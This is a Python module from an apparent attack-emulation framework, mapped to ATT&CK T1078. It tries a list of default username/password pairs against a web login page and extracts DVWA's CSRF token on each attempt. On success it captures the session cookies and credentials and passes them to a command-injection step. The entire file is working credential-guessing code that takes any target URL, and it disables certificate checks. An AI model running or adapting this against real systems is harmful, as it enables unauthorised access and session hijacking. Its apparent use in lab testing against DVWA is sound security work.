"""
techniques/initial_access/http_default_creds.py
ATT&CK: T1078 — Valid Accounts (Default Credentials)
Tactic:  Initial Access

Attempts to log into a web application using default credentials.
Handles DVWA's CSRF token (user_token) correctly — fetches the login
page, extracts the token, and submits it with each attempt.
"""

import re
import requests
from typing import Any
from requests.exceptions import RequestException

from core.context import Context
from core.technique import Tactic, Technique

DEFAULT_PAIRS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", ""),
    ("admin", "1234"),
    ("admin", "admin123"),
    ("root", "root"),
    ("root", "toor"),
    ("user", "user"),
    ("test", "test"),
]


def _extract_user_token(html: str) -> str | None:
    """Extract DVWA's CSRF user_token from a login page."""
    match = re.search(
        r"<input[^>]+name=['\"]user_token['\"][^>]+value=['\"]([a-f0-9]+)['\"]",
        html, re.IGNORECASE
    )
    if not match:
        match = re.search(
            r"<input[^>]+value=['\"]([a-f0-9]+)['\"][^>]+name=['\"]user_token['\"]",
            html, re.IGNORECASE
        )
    return match.group(1) if match else None


class HTTPDefaultCreds(Technique):
    name = "http-default-creds"
    attack_id = "T1078"
    tactic = Tactic.INITIAL_ACCESS

    def __init__(
        self,
        target_url: str,
        login_path: str = "/login.php",
        username_field: str = "username",
        password_field: str = "password",
        success_indicator: str = "logout",
        failure_indicator: str = "incorrect",
        extra_fields: dict | None = None,
        timeout: float = 8.0,
    ):
        self.target_url = target_url.rstrip("/")
        self.login_path = login_path
        self.username_field = username_field
        self.password_field = password_field
        self.success_indicator = success_indicator.lower()
        self.failure_indicator = failure_indicator.lower()
        self.extra_fields = extra_fields or {}
        self.timeout = timeout

    def run(self, context: Context) -> tuple[bool, str, dict[str, Any]]:
        login_url = f"{self.target_url}{self.login_path}"
        tried = 0
        found: dict | None = None

        for username, password in DEFAULT_PAIRS:
            tried += 1
            # Fresh session + fresh CSRF token for each attempt
            session = requests.Session()
            try:
                login_page = session.get(
                    login_url, timeout=self.timeout, verify=False
                )
                user_token = _extract_user_token(login_page.text)

                payload = {
                    self.username_field: username,
                    self.password_field: password,
                    **self.extra_fields,
                }
                if user_token:
                    payload["user_token"] = user_token
                # DVWA also needs the Login submit button value
                payload.setdefault("Login", "Login")

                resp = session.post(
                    login_url,
                    data=payload,
                    timeout=self.timeout,
                    allow_redirects=True,
                    verify=False,
                )
                body = resp.text.lower()
                if self.success_indicator in body and self.failure_indicator not in body:
                    found = {
                        "username": username,
                        "cookies": dict(session.cookies),
                        "status_code": resp.status_code,
                    }
                    # Store session cookies in Context for CommandInjection to use
                    context.extra["web_session_cookies"] = found["cookies"]
                    context.add_credential(
                        username=username,
                        password=password,
                        source_technique=self.name,
                        valid_on=self.target_url,
                    )
                    break
            except RequestException:
                continue

        if found:
            summary = (
                f"Valid web credentials found at {login_url}: "
                f"{found['username']} (tried {tried} pairs)"
            )
        else:
            summary = (
                f"No default credentials accepted at {login_url} "
                f"after {tried} attempts"
            )

        return bool(found), summary, {
            "login_url": login_url,
            "pairs_tried": tried,
            "credential_found": bool(found),
            "username": found["username"] if found else None,
        }
